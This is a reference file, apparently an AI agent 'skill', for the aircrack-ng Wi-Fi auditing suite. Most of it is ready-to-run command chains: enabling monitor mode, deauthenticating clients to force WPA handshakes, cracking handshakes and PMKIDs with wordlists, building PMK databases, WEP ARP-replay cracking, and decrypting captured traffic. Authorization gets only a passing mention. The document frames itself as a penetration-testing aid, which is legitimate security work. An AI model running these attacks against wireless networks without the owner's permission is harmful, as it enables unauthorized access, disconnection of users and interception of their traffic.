---
name: aircrack-ng
description: "Auth/lab ref: 802.11 auditing suite for monitor-mode Wi-Fi assessment, including handshake capture, deauthentication-assisted testing, WEP workflows, injection checks, precomputed PMK cracking, and offline traffic."
license: MIT
compatibility: "C; Linux."
metadata:
  author: AeonDave
  version: "1.0"
---

# Aircrack-ng

Monitor-mode Wi‑Fi assessment suite for capture, injection, and classic wireless attack chains.

## Quick Start

```bash
apt install aircrack-ng

# 1. Enable monitor mode
airmon-ng check
airmon-ng check kill
airmon-ng start wlan0    # Creates wlan0mon

# 2. Discover networks
airodump-ng wlan0mon

# 3. Capture target handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# 4. Deauth client (separate terminal) to force handshake when authorized
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# 5. Crack WPA handshake
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
```

## Why Use It

Choose `aircrack-ng` when you need:
- direct control over monitor-mode capture
- repeatable WPA/WPA2 handshake workflows
- classic WEP assessment support
- packet injection and replay testing
- offline cracking handoff to wordlists or companion tools
- decryption of captured traffic after recovering keys

## Tool Suite

| Tool | Purpose |
|------|---------|
| `airmon-ng` | Monitor mode management |
| `airodump-ng` | Packet capture / AP discovery |
| `aireplay-ng` | Packet injection / deauth |
| `aircrack-ng` | WEP/WPA cracking |
| `airdecap-ng` | Decrypt captured traffic |
| `airgraph-ng` | Visualize network topology |

## Practical Notes

- Adapter quality matters more than clever syntax.
- Monitor mode and injection support should be validated before the engagement depends on them.
- `aireplay-ng --fakeauth` is a **WEP** association technique; it is not a WPA/WPA2 authentication method.
- When injection or fake authentication fails, verify channel lock, BSSID / ESSID accuracy, and whether the AP is rejecting non-associated stations.
- For passive, multi-sensor RF visibility, `kismet` is often a better first choice.
- For fast automation across multiple APs, `wifite` is usually faster.

## Common Workflows

**Validate injection before depending on replay attacks:**
```bash
aireplay-ng -9 wlan0mon
```

**WPA PMKID attack (no client needed, companion tooling):**
```bash
hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng
hcxpcapngtool pmkid.pcapng -o hashes.22000
hashcat -m 22000 hashes.22000 rockyou.txt
```

**Precompute PMKs for repeated ESSID-specific cracking:**
```bash
echo "TargetSSID" > essid.txt
airolib-ng target.sqlite --import essid essid.txt
airolib-ng target.sqlite --import passwd /usr/share/wordlists/rockyou.txt
airolib-ng target.sqlite --batch
aircrack-ng -r target.sqlite capture-01.cap
```

**WEP crack:**
```bash
airodump-ng -c 11 --bssid BSSID -w wep wlan0mon
aireplay-ng -3 -b BSSID wlan0mon   # ARP replay
aircrack-ng wep-01.cap              # Auto-cracks when enough IVs
```

**Decrypt recovered traffic for Wireshark / tshark review:**
```bash
airdecap-ng -b AA:BB:CC:DD:EE:FF -e TargetSSID -p recovered-pass capture-01.cap
```

## Best Fit

| Need | Better fit |
|------|------------|
| Precise Linux monitor-mode capture | `aircrack-ng` |
| Passive Wi‑Fi / Bluetooth / RF recon | `kismet` |
| Rapid automated WPA/PMKID workflow | `wifite` |

## Resources

| File | When to load |
|------|--------------|
| `references/adapter-and-capture-workflows.md` | For adapter prep, fake-auth caveats, handshake/PMKID/WEP workflows, hidden SSID recovery, PMK databases, and decryption follow-up |
